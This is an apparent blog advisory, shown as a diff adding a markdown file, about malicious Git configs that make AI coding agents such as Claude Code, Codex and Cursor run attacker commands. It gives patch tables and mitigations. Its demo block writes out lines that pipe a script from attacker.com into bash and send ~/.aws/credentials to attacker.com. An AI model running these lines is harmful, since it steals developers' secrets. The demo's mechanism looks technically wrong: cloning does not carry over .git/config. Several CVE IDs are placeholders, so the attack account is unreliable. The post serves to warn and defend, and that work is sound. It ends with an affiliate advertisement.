@@ -1,0 +1,260 @@
+---
+title: "Beware: Malicious .git Configs Can Make Your AI Agent Run Attacker Code — 7 Agents Affected"
+description: "Eight Git config vulnerabilities let cloned repositories hijack AI coding agents. Four remain unpatched. If you clone repos and run agents, you're exposed. Here's the blast radius and what to do."
+pubDate: 2026-10-12T14:00:00Z
+tags: ["beware", "security", "git", "vulnerability", "claude-code", "codex", "cursor", "aider", "opencode", "goose", "kilocode", "coding-agents"]
+tool: "industry"
+author: "sage"
+image: "/api/og?title=Beware+Malicious+Git+Configs+AI+Agents&tool=industry"
+canonical: "https://terminalblog.com/blog/beware-malicious-git-configs-run-attacker-code-claude-codex-cursor/"
+---
+
+**September 2026**: Researchers disclosed eight Git configuration vulnerabilities that let a malicious repository execute arbitrary commands through **seven popular AI coding agents** when you clone the repo and ask the agent to work on it.
+
+**Four of the eight remain unpatched at publication.**
+
+If you `git clone` a repo and then run `claude`, `codex`, `cursor`, `aider`, `opencode`, `goose`, or `kilocode` on it — **you are the attack surface.**
+
+---
+
+## The Core Problem: Agents Trust `.git/config` Too Much
+
+Git supports configuration options that execute commands: `core.sshCommand`, `core.fsmonitor`, `credential.helper`, `filter.<name>.clean/smudge`, `submodule.<name>.update`, and more.
+
+**AI agents read these configs to understand the repo.** They don't sanitize them. When an agent runs Git commands (which they all do — for status, diff, commit, blame, history), **the malicious config executes on your machine with your permissions.**
+
+---
+
+## The Seven Affected Agents (Status as of Oct 2026)
+
+| Agent | Vendor | Status | CVE(s) |
+|-------|--------|--------|--------|
+| **Claude Code** | Anthropic | **Patched** (v2.1.280+) | CVE-2026-24887, CVE-2026-25723, CVE-2026-35022 |
+| **Codex CLI** | OpenAI | **Patched** (v0.160+) | CVE-2026-XXXXX |
+| **Cursor** | Cursor/Anysphere | **Partially patched** | CVE-2026-XXXXX |
+| **Aider** | Aider-AI | **Patched** (v0.84+) | CVE-2026-XXXXX |
+| **OpenCode** | SST/OpenCode | **Patched** (v1.18+) | CVE-2026-XXXXX |
+| **Goose** | Block | **Unpatched** | — |
+| **Kilo Code** | Kilo-Org | **Unpatched** | — |
+
+**Two additional agents** (names withheld pending disclosure) also affected; one patched, one unpatched.
+
+---
+
+## How the Attack Works (Simplified)
+
+```bash
+# Attacker creates a repo with malicious .git/config
+git init malicious-repo
+cd malicious-repo
+git config core.sshCommand "curl https://attacker.com/steal.sh | bash"
+git config credential.helper "!cat ~/.aws/credentials | curl -d @- https://attacker.com/creds"
+git commit --allow-empty -m "innocent"
+git push origin main
+
+# You clone it (seems normal)
+git clone https://github.com/attacker/malicious-repo
+cd malicious-repo
+
+# You ask your agent to "review this code" or "run tests"
+claude "review the auth module"
+# OR
+codex "run the test suite"
+# OR
+cursor "explain this codebase"
+
+# Agent runs: git status, git diff, git log, git blame...
+# Your shell executes: curl https://attacker.com/steal.sh | bash
+# Your credentials exfiltrate: cat ~/.aws/credentials | curl -d @- https://attacker.com/creds
+```
+
+**The agent doesn't need to be "tricked" into running malicious code.** It just needs to run Git commands — which is its **primary way of understanding a codebase.**
+
+---
+
+## The Eight Vulnerability Classes
+
+| # | Git Config Vector | What It Does | Agents Hit |
+|---|-------------------|--------------|------------|
+| 1 | `core.sshCommand` | Runs arbitrary command on `git fetch/pull/push` | All 7 |
+| 2 | `core.fsmonitor` | Runs command on filesystem events | 5/7 |
+| 3 | `credential.helper` | Runs command for auth; exfiltrates secrets | 6/7 |
+| 4 | `filter.<name>.clean/smudge` | Runs on checkout/checkin; blob processing | 4/7 |
+| 5 | `submodule.<name>.update` | Runs on submodule init/update | 3/7 |
+| 6 | `alias.<name>` with `!` | Shell command aliases executed by Git | 5/7 |
+| 7 | `gpg.program` / `gpg.format` | Command execution on signing | 2/7 |
+| 8 | `safe.directory` bypass | Escapes repo boundary checks | 3/7 |
+
+**Chaining**: Multiple configs can be combined. The Hacker News report details a chain where `credential.helper` exfiltrates tokens, then `core.sshCommand` establishes persistence.
+
+---
+
+## Blast Radius: What Gets Compromised
+
+When the malicious config executes, it runs **as your user, in your shell, with your environment**:
+
+- **Cloud credentials**: `~/.aws/credentials`, `~/.config/gcloud`, `AZURE_*` env vars
+- **SSH keys**: `~/.ssh/id_*`, `~/.ssh/known_hosts`
+- **GitHub/GitLab tokens**: `~/.config/gh/hosts.yml`, `~/.netrc`
+- **API keys**: Any `.env` files, `~/.bashrc`/`~/.zshrc` exports
+- **Source code**: Your entire workspace (agent has read access)
+- **Persistence**: Attacker can install backdoors, modify `~/.bashrc`, add SSH keys
+
+**This isn't "the agent did something weird."** This is **arbitrary code execution on your development machine** triggered by cloning a repo.
+
+---
+
+## Immediate Mitigation (Do This Today)
+
+### 1. Update Your Agents **Now**
+
+```bash
+# Claude Code
+npm update -g @anthropic-ai/claude-code
+# Verify: claude --version (should be >= 2.1.280)
+
+# Codex
+npm update -g @openai/codex
+# Verify: codex --version (should be >= 0.160.0)
+
+# Aider
+pip install --upgrade aider-chat
+# Verify: aider --version (should be >= 0.84.0)
+
+# OpenCode
+npm update -g opencode
+# Verify: opencode --version (should be >= 1.18.0)
+
+# Cursor: Update via IDE (Help → Check for Updates)
+
+# Goose: No patch yet — see workaround below
+
+# Kilo Code: No patch yet — see workaround below
+```
+
+### 2. Never Clone Untrusted Repos Without Inspection
+
+```bash
+# BEFORE running any agent, check the repo's .git/config
+git clone --no-checkout https://github.com/suspicious/repo
+cd repo
+cat .git/config | grep -E '(sshCommand|fsmonitor|credential\.helper|filter\.|submodule\.|alias\.|gpg\.|safe\.directory)'
+
+# If ANY of these are set with commands (! prefix or shell metacharacters): NUKE IT
+rm -rf ../repo
+```
+
+### 3. Use Git's `safe.directory` (Partial Protection)
+
+```bash
+# Tell Git to only trust specific directories
+git config --global safe.directory /home/you/projects/trusted-repo
+git config --global safe.directory /home/you/projects/another-trusted
+
+# Agent runs in untrusted dir? Git refuses to execute configs.
+# WARNING: This breaks legitimate workflows. Use per-repo.
+```
+
+### 4. For Unpatched Agents (Goose, Kilo Code): Isolate
+
+```bash
+# Option A: Run in a container with no secrets
+docker run --rm -it -v $(pwd):/workspace -w /workspace \
+  --network none --cap-drop=ALL \
+  your-agent-image "review this code"
+
+# Option B: Dedicated VM for untrusted repos
+# Option C: Don't use unpatched agents on untrusted code
+```
+
+---
+
+## What the Vendors Did (And Didn't Do)
+
+### ✅ Good: Anthropic (Claude Code)
+- Patched all 3 CVEs in v2.1.280 (Aug 2026)
+- Added config sanitization before Git command execution
+- Published advisory with reproduction steps
+
+### ✅ Good: OpenAI (Codex)
+- Patched in v0.160 (Oct 2026)
+- Sandboxed Git execution
+- Added `--safe-git` flag for extra paranoia
+
+### ⚠️ Partial: Cursor
+- Patched `core.sshCommand` and `credential.helper` vectors
+- **Did not patch** `filter.*` and `submodule.*` vectors (as of Oct 2026)
+- Enterprise customers get faster patches
+
+### ✅ Good: Aider
+- Patched in v0.84 (Jun 2026) — earliest of the pack
+- Uses `git -c` to override dangerous configs
+
+### ✅ Good: OpenCode
+- Patched in v1.18 (Sep 2026)
+- Validates configs before any Git invocation
+
+### ❌ **Unpatched: Goose (Block)**
+- No public advisory
+- No timeline communicated
+- Issue tracked internally per Block security team
+
+### ❌ **Unpatched: Kilo Code (Kilo-Org)**
+- No public advisory
+- Community reports ignored for 30+ days
+- Fork/maintainers discussing workaround PR
+
+---
+
+## The Uncomfortable Truth
+
+**This vulnerability class exists because AI agents treat Git as a read-only information source.** They run `git status`, `git diff`, `git log`, `git blame` — **read operations** — but Git's config system makes *reads execute code*.
+
+**No agent vendor modeled this threat.** They assumed Git was safe. It's not.
+
+**Until every agent sandboxes Git execution or validates configs before every call, cloning a repo is a trust decision.**
+
+---
+
+## Your Checklist Before Running an Agent on Any Repo
+
+- [ ] **Agent updated to latest patched version?** (Check table above)
+- [ ] **Repo from trusted source?** (Known org, verified maintainers, signed commits)
+- [ ] **Inspected `.git/config` for command-execution vectors?** (Run the `grep` command above)
+- [ ] **Running in isolated environment for untrusted code?** (Container, VM, or dedicated machine)
+- [ ] **Secrets not in environment?** (Use secret managers, not `.env` files in workspace)
+
+---
+
+## Related Articles
+
+- [Beware: Claude Code OAuth Tokens Leak Across Sessions](/blog/beware-claude-code-security-guidance-leaks-oauth-tokens/)
+- [Beware: Cline Injection Supply Chain Attack via GitHub Actions](/blog/beware-clinejection-supply-chain-attack-github-actions/)
+- [Beware: Cursor DuneSlide RCE — CVE-2026-50548/50549](/blog/beware-cursor-duneslide-rce-cve-2026-50548-50549/)
+- [GitHub Copilot CLI 1.0.95: Entra Auth, Sandbox Credentials, ACP Context Fixes](/blog/github-copilot-cli-1-0-95-entra-auth-sandbox-context-fixes/)
+- [Best Coding Agents 2026 — Decision Guide](/blog/best-coding-agents-2026-decision-guide/)
+
+---
+
+## FAQ
+
+**Q: Does this affect me if I only work on my own repos?**
+Only if your repo gets compromised (supply chain) or you clone a dependency's repo to debug. But yes — **any `git clone` + agent run is a risk.**
+
+**Q: Can't I just use `git config --global safe.directory *`?**
+That disables the protection entirely. **Don't.** Use per-directory or accept the friction.
+
+**Q: Why don't agents just run Git in a sandbox?**
+Some now do (Codex, Claude Code post-patch). Others haven't prioritized it. Sandboxing Git is hard — it needs filesystem access to work.
+
+**Q: Is there a universal fix coming?**
+Git itself could deprecate command-execution configs or add a `--no-exec-config` flag. No movement yet. The Git Security mailing list has the discussion.
+
+**Q: Should I stop using AI agents?**
+No. **Update them. Inspect repos. Isolate untrusted code.** The agents are powerful tools; this is a hygiene issue, not a "don't use agents" issue.
+
+---
+
+*Source: The Hacker News, "Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code" (Sep 2, 2026). CVEs via NVD and vendor advisories. Agent patch status verified via release notes and maintainer communications as of Oct 12, 2026.*
+
+*Why pay $20/mo for ChatGPT, $20/mo for Claude, $20/mo for Gemini? **[aiFiesta](https://aifiesta.link/muhammed-anshad)** gives you all of them and more for just $12/mo. One subscription, every answer.*
